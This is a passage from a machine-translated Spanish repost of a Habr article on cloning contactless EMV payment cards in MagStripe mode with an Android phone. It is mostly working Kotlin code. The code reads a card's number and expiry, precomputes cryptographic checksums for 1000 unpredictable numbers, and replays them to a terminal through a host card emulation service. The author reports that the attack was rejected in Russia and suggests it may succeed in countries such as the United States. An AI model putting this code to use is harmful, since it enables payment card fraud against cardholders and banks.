podemos mostrarlo en la pantalla. <br><br><pre> <code class="plaintext hljs"> private fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br>  Un conjunto de comandos que necesitamos. <br><br><pre> <code class="plaintext hljs">object Commands { val SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br>  Para implementar escuchas telef√≥nicas de comandos desde el terminal, debe iniciar su servicio y declararlo en el manifiesto.  En este servicio, un comando del terminal llega a processCommandApdu, lo comparamos con el que est√° almacenado en el archivo y damos la respuesta, que se escribe en la siguiente l√≠nea. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br>  Un par de capturas de pantalla de la aplicaci√≥n.  Leemos la tarjeta y el registro de parsim: <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br>  Por lo tanto, es posible simular el funcionamiento de una tarjeta EMV sin contacto en un tel√©fono con datos de la tarjeta.  Pero afortunadamente o desafortunadamente para alguien, este ataque no funciona en Rusia.  Seg√∫n nuestros experimentos, la transacci√≥n siempre lleg√≥ al banco del emisor y fue rechazada por el propio banco.  Adem√°s, no pudimos realizar una transacci√≥n fuera de l√≠nea con MagStripe.  Sin embargo, tal ataque puede implementarse en otros pa√≠ses donde el uso del modo MagStripe es bastante com√∫n y el algoritmo de gesti√≥n de riesgos es ligeramente diferente, por ejemplo, en los Estados Unidos. <br><br><h4>  Enlaces con la ayuda de este art√≠culo </h4><br>  Tarjetas de microprocesador bancario / I.M. Goldovsky - M.: TsIPSiR: Alpina Pub Lakers, 2010 .-- 686 p. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Proyecto EMV: paso a paso</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Investigaci√≥n de investigadores austriacos</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Enlace al c√≥digo de la aplicaci√≥n</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Simulador de terminal.</a> <br><br>  Gracias a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">barracud4</a> por <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">ayudarme a</a> preparar este art√≠culo. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es421543/">https://habr.com/ru/post/es421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es421529/index.html">Netflix, Uber, Google y usted en MBLT DEV 2018</a></li>
<li><a href="../es421531/index.html">C√≥mo integrar ReactJS en 1C-Bitrix con generaci√≥n autom√°tica de plantillas en el back-end utilizando el ejemplo de la red Globus</a></li>
<li><a href="../es421533/index.html">Elegir un lenguaje de programaci√≥n: 3 consejos de un programador de Apple</a></li>
<li><a href="../es421535/index.html">Aventura - Electr√≥nica. En un columpio alado en el mundo de TI</a></li>
<li><a href="../es421537/index.html">Funciones de orden superior en JS: Young Fighter Course</a></li>
<li><a href="../es421545/index.html">Revisi√≥n de PocketBook 616: la billetera 2018 m√°s econ√≥mica con funci√≥n de retroiluminaci√≥n</a></li>
<li><a href="../es421547/index.html">Aceptaci√≥n del centro de datos independiente</a></li>
<li><a href="../es421549/index.html">Estamos escribiendo documentaci√≥n t√©cnica: una gu√≠a para el profano</a></li>
<li><a href="../es421551/index.html">Dominando Vuex - De cero a h√©roe</a></li>
<li><a href="../es421553/index.html">Compartimos contenido tecnol√≥gico: hemos reunido todos nuestros materiales en un solo sitio</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>